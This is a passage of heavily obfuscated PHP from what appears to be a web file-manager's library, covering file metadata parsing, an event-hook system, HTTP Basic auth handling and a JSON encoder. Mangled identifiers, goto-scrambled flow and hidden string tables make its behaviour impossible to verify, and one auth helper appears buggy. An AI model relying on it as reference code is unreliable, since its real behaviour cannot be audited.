(!self::support($cÖÍæ’ƒê[$eßó˜É·ˆ[156]]) || isset($cÖÍæ’ƒê[$eßó˜É·ˆ[422]])) { return; } $F–ÅÊ£¿ƒä = $eßó˜É·ˆ[1588] . $cÖÍæ’ƒê[$eßó˜É·ˆ[75]]; goto c÷ºĞšƒ; E·¥Òß‚ëí: $cÄ¼ËÍˆÅì[$eßó˜É·ˆ[368]] = $AàÆÀôÛ÷¯; $cÖÍæ’ƒê[$eßó˜É·ˆ[422]] = $cÄ¼ËÍˆÅì; return $cÖÍæ’ƒê; goto BáÁ®Ñ©×˜; c÷ºĞšƒ: $AàÆÀôÛ÷¯ = $cÖÍæ’ƒê[$eßó˜É·ˆ[156]]; try { if ($cÖÍæ’ƒê[$eßó˜É·ˆ[156]] == $eßó˜É·ˆ[1589]) { $cÄ¼ËÍˆÅì = self::psdParse($F–ÅÊ£¿ƒä); $AàÆÀôÛ÷¯ = $eßó˜É·ˆ[1590]; } else { if ($cÖÍæ’ƒê[$eßó˜É·ˆ[156]] == $eßó˜É·ˆ[1591]) { $cÄ¼ËÍˆÅì = self::pdfParse($F–ÅÊ£¿ƒä); } else { $AàÆÀôÛ÷¯ = self::$fileTypeArray[$eßó˜É·ˆ[1592]][$cÖÍæ’ƒê[$eßó˜É·ˆ[156]]]; $f÷¸º¡£Áò = self::$fileTypeArray[$eßó˜É·ˆ[1593]][$AàÆÀôÛ÷¯][$eßó˜É·ˆ[1594]]; $bğ‘ƒÆÃØË = @$CãÛ÷íïÚ‚->analyze($F–ÅÊ£¿ƒä, $cÖÍæ’ƒê[$eßó˜É·ˆ[77]], $cÖÍæ’ƒê[$eßó˜É·ˆ[28]]); $cÄ¼ËÍˆÅì = self::parseData($bğ‘ƒÆÃØË, $f÷¸º¡£Áò, $cÖÍæ’ƒê); } } } catch (Exception $eÊçÁ‡ƒè³) { $cÄ¼ËÍˆÅì = array($eßó˜É·ˆ[368] => $AàÆÀôÛ÷¯); } if (!$cÄ¼ËÍˆÅì) { return; } goto E·¥Òß‚ëí; DµÚÈ£±µ“: $eßó˜É·ˆ =& $_SERVER[Ö¹ñÒÁ²÷]; static $CãÛ÷íïÚ‚; if (!$CãÛ÷íïÚ‚) { require SDK_DIR . $eßó˜É·ˆ[1587]; $CãÛ÷íïÚ‚ = new getID3(); } goto D·©»Ú˜¦·; BáÁ®Ñ©×˜: } public static function support($d³©°¡¸Ş) { goto b–‹¡—·ö; bÓò¨ ù: $a®¾§¤©…â = array($B²ÓÕ‰ù»[1591], $B²ÓÕ‰ù»[1589]); if (in_array($d³©°¡¸Ş, $a®¾§¤©…â)) { return !0; } if (isset(self::$fileTypeArray[$B²ÓÕ‰ù»[1592]][$d³©°¡¸Ş])) { return !0; } goto bßç ğÍÍˆ; b–‹¡—·ö: $B²ÓÕ‰ù» =& $_SERVER[Ö¹ñÒÁ²÷]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $d³©°¡¸Ş = strtolower($d³©°¡¸Ş); goto bÓò¨ ù; bßç ğÍÍˆ: return !1; goto F†×·Úæ¯Û; F†×·Úæ¯Û: } private static function parseData($FñÛÄ¶Á, $Dô…Û¿ò¥Â, $cŒ¨Ş×‘Ÿ¶) { $f«´Ô«äİ =& $_SERVER[Ö¹ñÒÁ²÷]; $BâîÎÔœ§ = $FñÛÄ¶Á[$f«´Ô«äİ[1595]]; $C©¼èÚ¶è§ = array(); foreach ($Dô…Û¿ò¥Â as $f¿©Ì­ÁÑŸ => $eÃåä­Å¯œ) { foreach ($eÃåä­Å¯œ as $eÇœ°„×¹‹) { if (is_array($eÇœ°„×¹‹)) { $eœÊÔ“¢‹„ = self::parseData($FñÛÄ¶Á, $eÃåä­Å¯œ, $cŒ¨Ş×‘Ÿ¶); if ($eœÊÔ“¢‹„) { $C©¼èÚ¶è§[$f¿©Ì­ÁÑŸ] = $eœÊÔ“¢‹„; } break; } $d­Ì‹ÍÓ×¶ = str_replace($f«´Ô«äİ[1368], $BâîÎÔœ§, $eÇœ°„×¹‹); $eœÊÔ“¢‹„ = _get($FñÛÄ¶Á, $d­Ì‹ÍÓ×¶); $eœÊÔ“¢‹„ = is_array($eœÊÔ“¢‹„) ? $eœÊÔ“¢‹„[0] : $eœÊÔ“¢‹„; if ($eœÊÔ“¢‹„) { break; } } if ($eœÊÔ“¢‹„ || $eœÊÔ“¢‹„ === 0 || $eœÊÔ“¢‹„ === !1) { $eœÊÔ“¢‹„ = self::valueReset($eÇœ°„×¹‹, $eœÊÔ“¢‹„, $f¿©Ì­ÁÑŸ); if ($eœÊÔ“¢‹„ !== null) { $C©¼èÚ¶è§[$f¿©Ì­ÁÑŸ] = $eœÊÔ“¢‹„; } } } $C©¼èÚ¶è§ = self::valueResetAll($C©¼èÚ¶è§, $cŒ¨Ş×‘Ÿ¶); return $C©¼èÚ¶è§; } private static function psdParse($bàä‚ÍÒÂÇ) { $fÄ³ñÀêì =& $_SERVER[Ö¹ñÒÁ²÷]; if (IO::fileSubstr($bàä‚ÍÒÂÇ, 0, 4) != $fÄ³ñÀêì[1596]) { return !1; } $bÕìºæğŒ = getImageSize($bàä‚ÍÒÂÇ, $ağ’ğƒñÇ); if (!$bÕìºæğŒ) { return; } $cÙâÏ£é„È = array($fÄ³ñÀêì[1511] => $bÕìºæğŒ[0], $fÄ³ñÀêì[1513] => $bÕìºæğŒ[1]); return $cÙâÏ£é„È; } private static function pdfParse($cíÍ‡‚®Ïø) { return FileParsePdf::parse($cíÍ‡‚®Ïø); } private static function fileTypeParse() { $e—İ¬¶©™ù =& $_SERVER[Ö¹ñÒÁ²÷]; $aéÙ÷Ö£–š = self::fileTypeArray(); $aÈø¦øƒšö = array(); foreach ($aéÙ÷Ö£–š as $bÍ‡½”£à => $B£‰Ç¹ˆ‚) { $e°¡‰½Õ™ = _get($B£‰Ç¹ˆ‚, $e—İ¬¶©™ù[156], $e—İ¬¶©™ù[33]); $eˆøÊ»»ŠÓ = is_string($e°¡‰½Õ™) ? explode($e—İ¬¶©™ù[47], $e°¡‰½Õ™) : $e°¡‰½Õ™; if (!$eˆøÊ»»ŠÓ) { continue; } foreach ($eˆøÊ»»ŠÓ as $e°¡‰½Õ™) { $e°¡‰½Õ™ = strtolower(trim($e°¡‰½Õ™)); if (!$e°¡‰½Õ™) { continue; } $aÈø¦øƒšö[$e°¡‰½Õ™] = $bÍ‡½”£à; } $aéÙ÷Ö£–š[$bÍ‡½”£à][$e—İ¬¶©™ù[156]] = array_keys($aÈø¦øƒšö); $aéÙ÷Ö£–š[$bÍ‡½”£à][$e—İ¬¶©™ù[1594]] = self::parseKeyMap($B£‰Ç¹ˆ‚[$e—İ¬¶©™ù[1594]]); } return array($e—İ¬¶©™ù[1593] => $aéÙ÷Ö£–š, $e—İ¬¶©™ù[1592] => $aÈø¦øƒšö); } private static function parseKeyMap($aÜƒ”Ô‰) { $E±ªŒƒ‚ó =& $_SERVER[Ö¹ñÒÁ²÷]; foreach ($aÜƒ”Ô‰ as $d†ö“ğàßà => $FèÔß±íá) { if (is_array($FèÔß±íá)) { $DÛÉ°ÄõÃë = self::parseKeyMap($FèÔß±íá); if ($DÛÉ°ÄõÃë) { $aÜƒ”Ô‰[$d†ö“ğàßà] = $DÛÉ°ÄõÃë; } continue; } $a¦ÕŒàŸá‚ = explode($E±ªŒƒ‚ó[47], $FèÔß±íá); $e¶ô¹‡öà = array(); foreach ($a¦ÕŒàŸá‚ as $Eôæ²íòŠ) { $Eôæ²íòŠ = trim($Eôæ²íòŠ); if (!$Eôæ²íòŠ) { continue; } if (preg_match($E±ªŒƒ‚ó[1597], $Eôæ²íòŠ, $A‚èèËÖ§)) { $eö‚Ê„» = explode($E±ªŒƒ‚ó[267], $A‚èèËÖ§[1]); foreach ($eö‚Ê„» as $A‰¾ÖáËƒø) { $e¶ô¹‡öà[] = str_replace($A‚èèËÖ§[0], $A‰¾ÖáËƒø, $Eôæ²íòŠ); } } else { $e¶ô¹‡öà[] = $Eôæ²íòŠ; } } $aÜƒ”Ô‰[$d†ö“ğàßà] = $e¶ô¹‡öà; } return $aÜƒ”Ô‰; } private static function valueResetAll($Eƒ¶†®Øªâ, $eÀ‚¾†ª«Ò) { goto a°ÈŒÁĞ®Õ; a°ÈŒÁĞ®Õ: $a¹¶ÖåÉë¥ =& $_SERVER[Ö¹ñÒÁ²÷]; if (isset($Eƒ¶†®Øªâ[$a¹¶ÖåÉë¥[1598]])) { $bŸó««ËØÇ = ceil($Eƒ¶†®Øªâ[$a¹¶ÖåÉë¥[1598]]); $c£”ÄŒ¬Ã = intval($bŸó««ËØÇ / 3600); $bÀ²¯É“ïÛ = intval(($bŸó««ËØÇ - $c£”ÄŒ¬Ã * 3600) / 60); $BÏàÇåö‘ï = $bŸó««ËØÇ % 60; $Eƒ¶†®Øªâ[$a¹¶ÖåÉë¥[1599]] = sprintf($a¹¶ÖåÉë¥[1600], $c£”ÄŒ¬Ã, $bÀ²¯É“ïÛ, $BÏàÇåö‘ï); if ($c£”ÄŒ¬Ã == 0) { $Eƒ¶†®Øªâ[$a¹¶ÖåÉë¥[1599]] = sprintf($a¹¶ÖåÉë¥[1601], $bÀ²¯É“ïÛ, $BÏàÇåö‘ï); } } $c—§–œÉ¢ = _get($Eƒ¶†®Øªâ, $a¹¶ÖåÉë¥[1602]); goto E÷­ŠÅÚœ‹; Bæ— Ãçš: $D™×ŠÊï¶è = _get($Eƒ¶†®Øªâ, $a¹¶ÖåÉë¥[1610], $a¹¶ÖåÉë¥[33]); $AÁŒ…à×æ¯ = $f–Öê‰…ğ . $FéÄÍÜŸÏà . $D™×ŠÊï¶è; if ($AÁŒ…à×æ¯ && get_charset($AÁŒ…à×æ¯) != $a¹¶ÖåÉë¥[322]) { $Eƒ¶†®Øªâ[$a¹¶ÖåÉë¥[1607]][$a¹¶ÖåÉë¥[1323]] = iconv_to($Eƒ¶†®Øªâ[$a¹¶ÖåÉë¥[1607]][$a¹¶ÖåÉë¥[1323]], get_charset($AÁŒ…à×æ¯), $a¹¶ÖåÉë¥[322]); $Eƒ¶†®Øªâ[$a¹¶ÖåÉë¥[1607]][$a¹¶ÖåÉë¥[1611]] = iconv_to($Eƒ¶†®Øªâ[$a¹¶ÖåÉë¥[1607]][$a¹¶ÖåÉë¥[1611]], get_charset($AÁŒ…à×æ¯), $a¹¶ÖåÉë¥[322]); $Eƒ¶†®Øªâ[$a¹¶ÖåÉë¥[1607]][$a¹¶ÖåÉë¥[1612]] = iconv_to($Eƒ¶†®Øªâ[$a¹¶ÖåÉë¥[1607]][$a¹¶ÖåÉë¥[1612]], get_charset($AÁŒ…à×æ¯), $a¹¶ÖåÉë¥[322]); } goto eÚ­À„‰; E÷­ŠÅÚœ‹: if ($c—§–œÉ¢) { $aˆÉêĞçÙ¡ = IO_PATH_SYSTEM_TEMP . $a¹¶ÖåÉë¥[1603] . KodIO::hashPath($eÀ‚¾†ª«Ò) . $a¹¶ÖåÉë¥[1604]; $Eƒ¶†®Øªâ[$a¹¶ÖåÉë¥[1605]] = Action($a¹¶ÖåÉë¥[1606])->pluginCacheFileSet($aˆÉêĞçÙ¡, $c—§–œÉ¢); unset($Eƒ¶†®Øªâ[$a¹¶ÖåÉë¥[1607]][$a¹¶ÖåÉë¥[1590]]); } $f–Öê‰…ğ = _get($Eƒ¶†®Øªâ, $a¹¶ÖåÉë¥[1608], $a¹¶ÖåÉë¥[33]); $FéÄÍÜŸÏà = _get($Eƒ¶†®Øªâ, $a¹¶ÖåÉë¥[1609], $a¹¶ÖåÉë¥[33]); goto Bæ— Ãçš; eÚ­À„‰: return $Eƒ¶†®Øªâ; goto Bäñ›«ÄÄ; Bäñ›«ÄÄ: } private static function valueReset($cëµó£è¯Ì, $Aì´å½éÌ, $F„¹ŒôˆÉÖ) { $dÃ§Ê¡‰ãÈ =& $_SERVER[Ö¹ñÒÁ²÷]; $C×À§î‰ = $dÃ§Ê¡‰ãÈ[1528]; switch ($cëµó£è¯Ì) { case $dÃ§Ê¡‰ãÈ[1613]: $Aì´å½éÌ = $Aì´å½éÌ == $dÃ§Ê¡‰ãÈ[83] ? $dÃ§Ê¡‰ãÈ[1614] : $dÃ§Ê¡‰ãÈ[1615]; break; case $dÃ§Ê¡‰ãÈ[1616]: $Aì´å½éÌ = $Aì´å½éÌ ? $Aì´å½éÌ : null; break; default: break; } switch ($F„¹ŒôˆÉÖ) { case $dÃ§Ê¡‰ãÈ[1617]: $Aì´å½éÌ = round($Aì´å½éÌ, 2); break; case $dÃ§Ê¡‰ãÈ[183]: case $dÃ§Ê¡‰ãÈ[106]: if ($Aì´å½éÌ < 0) { $Aì´å½éÌ = null; } else { if (is_numeric($Aì´å½éÌ)) { $Aì´å½éÌ = date($C×À§î‰, $Aì´å½éÌ); } } break; default: break; } return $Aì´å½éÌ; } private static function fileTypeArray() { $Bá´„ç¡Õ =& $_SERVER[Ö¹ñÒÁ²÷]; return array($Bá´„ç¡Õ[1590] => array($Bá´„ç¡Õ[156] => $Bá´„ç¡Õ[1618] . $Bá´„ç¡Õ[1619], $Bá´„ç¡Õ[1594] => array($Bá´„ç¡Õ[1511] => $Bá´„ç¡Õ[1620], $Bá´„ç¡Õ[1513] => $Bá´„ç¡Õ[1621], $Bá´„ç¡Õ[1622] => $Bá´„ç¡Õ[1623], $Bá´„ç¡Õ[1624] => $Bá´„ç¡Õ[1625], $Bá´„ç¡Õ[183] => $Bá´„ç¡Õ[1626], $Bá´„ç¡Õ[106] => $Bá´„ç¡Õ[1627], $Bá´„ç¡Õ[1628] => $Bá´„ç¡Õ[1629], $Bá´„ç¡Õ[1630] => $Bá´„ç¡Õ[1631], $Bá´„ç¡Õ[1632] => $Bá´„ç¡Õ[1633], $Bá´„ç¡Õ[1634] => $Bá´„ç¡Õ[1635], $Bá´„ç¡Õ[1636] => $Bá´„ç¡Õ[1637], $Bá´„ç¡Õ[1638] => $Bá´„ç¡Õ[1639], $Bá´„ç¡Õ[1640] => $Bá´„ç¡Õ[1641], $Bá´„ç¡Õ[1642] => array($Bá´„ç¡Õ[1643] => $Bá´„ç¡Õ[1644], $Bá´„ç¡Õ[1645] => $Bá´„ç¡Õ[1646], $Bá´„ç¡Õ[1647] => $Bá´„ç¡Õ[1648]), $Bá´„ç¡Õ[1649] => $Bá´„ç¡Õ[1650], $Bá´„ç¡Õ[1651] => $Bá´„ç¡Õ[1652], $Bá´„ç¡Õ[1653] => $Bá´„ç¡Õ[1654], $Bá´„ç¡Õ[1655] => $Bá´„ç¡Õ[1656], $Bá´„ç¡Õ[1657] => array($Bá´„ç¡Õ[1658] => $Bá´„ç¡Õ[1659], $Bá´„ç¡Õ[1660] => $Bá´„ç¡Õ[1661], $Bá´„ç¡Õ[1662] => $Bá´„ç¡Õ[1663], $Bá´„ç¡Õ[1664] => $Bá´„ç¡Õ[1665], $Bá´„ç¡Õ[1666] => $Bá´„ç¡Õ[1667], $Bá´„ç¡Õ[1668] => $Bá´„ç¡Õ[1669], $Bá´„ç¡Õ[1670] => $Bá´„ç¡Õ[1671], $Bá´„ç¡Õ[1672] => $Bá´„ç¡Õ[1673], $Bá´„ç¡Õ[1674] => $Bá´„ç¡Õ[1675], $Bá´„ç¡Õ[1676] => $Bá´„ç¡Õ[1677], $Bá´„ç¡Õ[1678] => $Bá´„ç¡Õ[1679]))), $Bá´„ç¡Õ[1680] => array($Bá´„ç¡Õ[156] => $Bá´„ç¡Õ[1681] . $Bá´„ç¡Õ[1682], $Bá´„ç¡Õ[1594] => array($Bá´„ç¡Õ[1598] => $Bá´„ç¡Õ[1683], $Bá´„ç¡Õ[183] => $Bá´„ç¡Õ[1684], $Bá´„ç¡Õ[106] => $Bá´„ç¡Õ[1685], $Bá´„ç¡Õ[1630] => $Bá´„ç¡Õ[1686], $Bá´„ç¡Õ[1687] => $Bá´„ç¡Õ[1688], $Bá´„ç¡Õ[1689] => $Bá´„ç¡Õ[1616], $Bá´„ç¡Õ[1690] => $Bá´„ç¡Õ[1691], $Bá´„ç¡Õ[1692] => $Bá´„ç¡Õ[1693], $Bá´„ç¡Õ[1694] => $Bá´„ç¡Õ[1695], $Bá´„ç¡Õ[1607] => array($Bá´„ç¡Õ[1323] => $Bá´„ç¡Õ[1696], $Bá´„ç¡Õ[1611] => $Bá´„ç¡Õ[1697], $Bá´„ç¡Õ[1612] => $Bá´„ç¡Õ[1698], $Bá´„ç¡Õ[1699] => $Bá´„ç¡Õ[1700], $Bá´„ç¡Õ[1701] => $Bá´„ç¡Õ[1702], $Bá´„ç¡Õ[1703] => $Bá´„ç¡Õ[1704], $Bá´„ç¡Õ[1590] => $Bá´„ç¡Õ[1705]))), $Bá´„ç¡Õ[1706] => array($Bá´„ç¡Õ[156] => $Bá´„ç¡Õ[1707] . $Bá´„ç¡Õ[1708], $Bá´„ç¡Õ[1594] => array($Bá´„ç¡Õ[1511] => $Bá´„ç¡Õ[1709], $Bá´„ç¡Õ[1513] => $Bá´„ç¡Õ[1710], $Bá´„ç¡Õ[1598] => $Bá´„ç¡Õ[1683], $Bá´„ç¡Õ[183] => $Bá´„ç¡Õ[1711], $Bá´„ç¡Õ[106] => $Bá´„ç¡Õ[1712], $Bá´„ç¡Õ[1617] => $Bá´„ç¡Õ[1713], $Bá´„ç¡Õ[1694] => $Bá´„ç¡Õ[1714], $Bá´„ç¡Õ[1690] => $Bá´„ç¡Õ[1715], $Bá´„ç¡Õ[1630] => $Bá´„ç¡Õ[1716], $Bá´„ç¡Õ[1680] => array($Bá´„ç¡Õ[1689] => $Bá´„ç¡Õ[1616], $Bá´„ç¡Õ[1717] => $Bá´„ç¡Õ[1718], $Bá´„ç¡Õ[1687] => $Bá´„ç¡Õ[1688], $Bá´„ç¡Õ[1694] => $Bá´„ç¡Õ[1695], $Bá´„ç¡Õ[1690] => $Bá´„ç¡Õ[1719], $Bá´„ç¡Õ[1692] => $Bá´„ç¡Õ[1693]))), $Bá´„ç¡Õ[1720] => array($Bá´„ç¡Õ[1594] => array($Bá´„ç¡Õ[1721] => $Bá´„ç¡Õ[1722], $Bá´„ç¡Õ[1723] => $Bá´„ç¡Õ[1724])), $Bá´„ç¡Õ[1725] => array($Bá´„ç¡Õ[1594] => array())); } } class Hook { private static $events = array(); public static function get($eˆ‹‡Šâ¾ = false) { if (!$eˆ‹‡Šâ¾) { return self::$events; } else { return self::$events[$eˆ‹‡Šâ¾]; } } public static function apply($fœŒĞ›¥†, $c¼âèÍ¬Ü = array()) { $B•¸ìî‰’ô = ActionApply($fœŒĞ›¥†, $c¼âèÍ¬Ü); if (is_string($fœŒĞ›¥†)) { Hook::trigger($fœŒĞ›¥†); } return $B•¸ìî‰’ô; } public static function bind($BÜÄÇ¼Ñ­Ó, $fªæ¹‰ˆŠ, $bª—´õİÚš = false) { $a•¢Ààï° =& $_SERVER[Ö¹ñÒÁ²÷]; if (!isset(self::$events[$BÜÄÇ¼Ñ­Ó])) { self::$events[$BÜÄÇ¼Ñ­Ó] = array(); } self::$events[$BÜÄÇ¼Ñ­Ó][] = array($a•¢Ààï°[1726] => $fªæ¹‰ˆŠ, $a•¢Ààï°[1727] => $bª—´õİÚš, $a•¢Ààï°[1728] => 0); } public static function once($eİ°ÌÕÕ•ˆ, $F»í‚ĞÓŒÂ) { self::bind($eİ°ÌÕÕ•ˆ, $F»í‚ĞÓŒÂ, !0); } public static function unbind($cö¥Š‹ÛŸÖ, $cµ¢’éÀÃÔ = false) { if (!$cµ¢’éÀÃÔ) { self::$events[$cö¥Š‹ÛŸÖ] = array(); return; } $dÙÚÚ™š–ñ = self::$events[$cö¥Š‹ÛŸÖ]; self::$events[$cö¥Š‹ÛŸÖ] = array(); if (!is_array($dÙÚÚ™š–ñ)) { return; } for ($B¢Åîã…³Ì = 0; $B¢Åîã…³Ì < count($dÙÚÚ™š–ñ); $B¢Åîã…³Ì++) { if ($dÙÚÚ™š–ñ[$B¢Åîã…³Ì][$_SERVER[Ö¹ñÒÁ²÷][1726]] == $cµ¢’éÀÃÔ) { continue; } self::$events[$cö¥Š‹ÛŸÖ][] = $dÙÚÚ™š–ñ[$B¢Åîã…³Ì]; } } public static function filter($b‘õ„»îÚ, $fÒ‹†×¼¿) { goto e£À“‰ÊŠ; e£À“‰ÊŠ: $b®ÙÇŞ =& $_SERVER[Ö¹ñÒÁ²÷]; $eèè÷åÈ = self::$events; if (!isset($eèè÷åÈ[$b‘õ„»îÚ])) { return $fÒ‹†×¼¿; } goto A®ÌÈÜğÕ§; A®ÌÈÜğÕ§: $Eò½Ã§¬Ç = $eèè÷åÈ[$b‘õ„»îÚ]; $b“³×÷†„§ = $fÒ‹†×¼¿; if (!is_array($Eò½Ã§¬Ç) || count($Eò½Ã§¬Ç) == 0) { return $b“³×÷†„§; } goto D»ª×éêˆ²; D»ª×éêˆ²: for ($B½¾µŒ…Êí = 0; $B½¾µŒ…Êí < count($Eò½Ã§¬Ç); $B½¾µŒ…Êí++) { $dñÑÜĞ¶«ï = $Eò½Ã§¬Ç[$B½¾µŒ…Êí]; if ($dñÑÜĞ¶«ï[$b®ÙÇŞ[1727]] && $dñÑÜĞ¶«ï[$b®ÙÇŞ[1728]] > 1) { continue; } self::$events[$b‘õ„»îÚ][$B½¾µŒ…Êí][$b®ÙÇŞ[1728]] = $dñÑÜĞ¶«ï[$b®ÙÇŞ[1728]] + 1; $cè½ĞÊÃœğ = self::apply($dñÑÜĞ¶«ï[$b®ÙÇŞ[1726]], array($b“³×÷†„§)); if (gettype($cè½ĞÊÃœğ) == gettype($b“³×÷†„§)) { $b“³×÷†„§ = $cè½ĞÊÃœğ; } } return $b“³×÷†„§; goto DÌ Ì®Å¶; DÌ Ì®Å¶: } public static function trigger($bÑ¡¦Á¿¢) { goto Dª…Öâ‡Ã÷; Dª…Öâ‡Ã÷: $e³‰£¶ÌÎò =& $_SERVER[Ö¹ñÒÁ²÷]; $D¦§­¥–Èœ = self::$events; $cœ¸ï™ãÑ÷ = !1; goto f‹ìÁ”­–ƒ; CêƒÇõø²È: return $cœ¸ï™ãÑ÷; goto AÑÙÜ£ñÚÓ; f‹ìÁ”­–ƒ: if (!isset($D¦§­¥–Èœ[$bÑ¡¦Á¿¢])) { return $cœ¸ï™ãÑ÷; } $cˆÍõõæï¡ = $D¦§­¥–Èœ[$bÑ¡¦Á¿¢]; if (!is_array($cˆÍõõæï¡) || count($cˆÍõõæï¡) == 0) { return $cœ¸ï™ãÑ÷; } goto f†Ô¯ Ğ³; f†Ô¯ Ğ³: $A¸Âà¨Ô”È = func_get_args(); array_shift($A¸Âà¨Ô”È); for ($D”¾†£’Óº = 0; $D”¾†£’Óº < count($cˆÍõõæï¡); $D”¾†£’Óº++) { $Cİ”ˆÓ¸ = $cˆÍõõæï¡[$D”¾†£’Óº]; if ($Cİ”ˆÓ¸[$e³‰£¶ÌÎò[1727]] && $Cİ”ˆÓ¸[$e³‰£¶ÌÎò[1728]] > 1) { continue; } if (defined($e³‰£¶ÌÎò[1729]) && GLOBAL_LOG_HOOK) { write_log($bÑ¡¦Á¿¢ . $e³‰£¶ÌÎò[1730] . $Cİ”ˆÓ¸[$e³‰£¶ÌÎò[1726]], $e³‰£¶ÌÎò[1731]); } self::$events[$bÑ¡¦Á¿¢][$D”¾†£’Óº][$e³‰£¶ÌÎò[1728]] = $Cİ”ˆÓ¸[$e³‰£¶ÌÎò[1728]] + 1; $B˜î¥Í»¢  = self::apply($Cİ”ˆÓ¸[$e³‰£¶ÌÎò[1726]], $A¸Âà¨Ô”È); if (defined($e³‰£¶ÌÎò[1729]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $e³‰£¶ÌÎò[1731]); if ($Cİ”ˆÓ¸[$e³‰£¶ÌÎò[1728]] == 200) { $d ‚’¶Ô = is_array($Cİ”ˆÓ¸[$e³‰£¶ÌÎò[1726]]) ? json_encode_force($Cİ”ˆÓ¸[$e³‰£¶ÌÎò[1726]]) : $Cİ”ˆÓ¸[$e³‰£¶ÌÎò[1726]]; write_log($e³‰£¶ÌÎò[1732] . $bÑ¡¦Á¿¢ . $e³‰£¶ÌÎò[1733] . $d ‚’¶Ô, $e³‰£¶ÌÎò[1734]); } } $cœ¸ï™ãÑ÷ = is_null($B˜î¥Í»¢ ) ? $cœ¸ï™ãÑ÷ : $B˜î¥Í»¢ ; } goto CêƒÇõø²È; AÑÙÜ£ñÚÓ: } } class HttpAuth { public static function get() { $E‚ºİ•¹×ô =& $_SERVER[Ö¹ñÒÁ²÷]; $cÔà²Ğ¼®İ = $E‚ºİ•¹×ô[33]; $FœŒ½›×‰ƒ = $E‚ºİ•¹×ô[33]; if (isset($_SERVER[$E‚ºİ•¹×ô[1735]])) { $cÔà²Ğ¼®İ = $_SERVER[$E‚ºİ•¹×ô[1735]]; $FœŒ½›×‰ƒ = $_SERVER[$E‚ºİ•¹×ô[1736]]; } elseif (isset($_SERVER[$E‚ºİ•¹×ô[1737]])) { $AÔóĞò¡´ñ = $_SERVER[$E‚ºİ•¹×ô[1737]]; if (strpos(strtolower($AÔóĞò¡´ñ), $E‚ºİ•¹×ô[1738]) === 0) { $b òšéĞè = explode($E‚ºİ•¹×ô[4], base64_decode(substr($AÔóĞò¡´ñ, 6))); $cÔà²Ğ¼®İ = isset($b òšéĞè[0]) ? $b òšéĞè[0] : $E‚ºİ•¹×ô[33]; $FœŒ½›×‰ƒ = isset($b òšéĞè[1]) ? $b òšéĞè[1] : 0; } } return array($E‚ºİ•¹×ô[531] => $cÔà²Ğ¼®İ, $E‚ºİ•¹×ô[893] => $FœŒ½›×‰ƒ); } public static function error() { goto eÓö·ŠŠ‹; b‹ššº‘´: die; goto AÂÊ”®¨‹; eÓö·ŠŠ‹: $AåïËìĞÈƒ =& $_SERVER[Ö¹ñÒÁ²÷]; header($AåïËìĞÈƒ[1739]); header($AåïËìĞÈƒ[1740]); goto BÎë‰Èç¥“; BÎë‰Èç¥“: header($AåïËìĞÈƒ[1741]); header($AåïËìĞÈƒ[1742]); header($AåïËìĞÈƒ[1249]); goto b‹ššº‘´; AÂÊ”®¨‹: } public static function make($e¶ÔäÀœ×Ê, $BˆÓ’ËöÂ) { $Có„ŞÑ”Ç =& $_SERVER[Ö¹ñÒÁ²÷]; return $Có„ŞÑ”Ç[1743] + base64_encode($e¶ÔäÀœ×Ê . $Có„ŞÑ”Ç[4] . $BˆÓ’ËöÂ); } } goto a÷ã†ï¾»œ; d…ÕÄ¦¦Ó˜: define($_SERVER[Ö¹ñÒÁ²÷][1912], 16); define($_SERVER[Ö¹ñÒÁ²÷][1913], 32); class Services_JSON { function __construct($Eğªº±´· = 0) { $this->use = $Eğªº±´·; } function utf162utf8($cƒÎÒĞÚİ) { $FŞ‹Œòš›³ =& $_SERVER[Ö¹ñÒÁ²÷]; if (function_exists($FŞ‹Œòš›³[68])) { return mb_convert_encoding($cƒÎÒĞÚİ, $FŞ‹Œòš›³[1565], $FŞ‹Œòš›³[1914]); } $eƒÜ¨×‡Ÿ¼ = ord($cƒÎÒĞÚİ[0]) << 8 | ord($cƒÎÒĞÚİ[1]); switch (!0) { case (127 & $eƒÜ¨×‡Ÿ¼) == $eƒÜ¨×‡Ÿ¼: return chr(127 & $eƒÜ¨×‡Ÿ¼); case (2047 & $eƒÜ¨×‡Ÿ¼) == $eƒÜ¨×‡Ÿ¼: return chr(192 | $eƒÜ¨×‡Ÿ¼ >> 6 & 31) . chr(128 | $eƒÜ¨×‡Ÿ¼ & 63); case (65535 & $eƒÜ¨×‡Ÿ¼) == $eƒÜ¨×‡Ÿ¼: return chr(224 | $eƒÜ¨×‡Ÿ¼ >> 12 & 15) . chr(128 | $eƒÜ¨×‡Ÿ¼ >> 6 & 63) . chr(128 | $eƒÜ¨×‡Ÿ¼ & 63); } return $FŞ‹Œòš›³[33]; } function utf82utf16($AÃÌëˆ¤²è) { $DÊƒ—¦“òÄ =& $_SERVER[Ö¹ñÒÁ²÷]; if (function_exists($DÊƒ—¦“òÄ[68])) { return mb_convert_encoding($AÃÌëˆ¤²è, $DÊƒ—¦“òÄ[1914], $DÊƒ—¦“òÄ[1565]); } switch (strlen($AÃÌëˆ¤²è)) { case 1: return $AÃÌëˆ¤²è; case 2: return chr(7 & ord($AÃÌëˆ¤²è[0]) >> 2) . chr(192 & ord($AÃÌëˆ¤²è[0]) << 6 | 63 & ord($AÃÌëˆ¤²è[1])); case 3: return chr(240 & ord($AÃÌëˆ¤²è[0]) << 4 | 15 & ord($AÃÌëˆ¤²è[1]) >> 2) . chr(192 & ord($AÃÌëˆ¤²è[1]) << 6 | 127 & ord($AÃÌëˆ¤²è[2])); } return $DÊƒ—¦“òÄ[33]; } function encode($b½Ò³–¡) { $dæÄÅ¨œ—Ÿ =& $_SERVER[Ö¹ñÒÁ²÷]; switch (gettype($b½Ò³–¡)) { case $dæÄÅ¨œ—Ÿ[1576]: return $b½Ò³–¡ ? $dæÄÅ¨œ—Ÿ[1575] : $dæÄÅ¨œ—Ÿ[1577]; case $dæÄÅ¨œ—Ÿ[1915]: return $dæÄÅ¨œ—Ÿ[99]; case $dæÄÅ¨œ—Ÿ[299]: return (int) $b½Ò³–¡; case $dæÄÅ¨œ—Ÿ[274]: case $dæÄÅ¨œ—Ÿ[273]: return (double) $b½Ò³–¡; case $dæÄÅ¨œ—Ÿ[308]: $d–¹Î‹×…– = $dæÄÅ¨œ—Ÿ[33]; $d·’÷Ş¸«¦ = strlen($b½Ò³–¡); for ($DªÈ¬¨äÜ¡ = 0; $DªÈ¬¨äÜ¡ < $d·’÷Ş¸«¦; ++$DªÈ¬¨äÜ¡) { $B«Åé™‚Óƒ = ord($b½Ò³–¡[$DªÈ¬¨äÜ¡]); switch (!0) { case $B«Åé™‚Óƒ 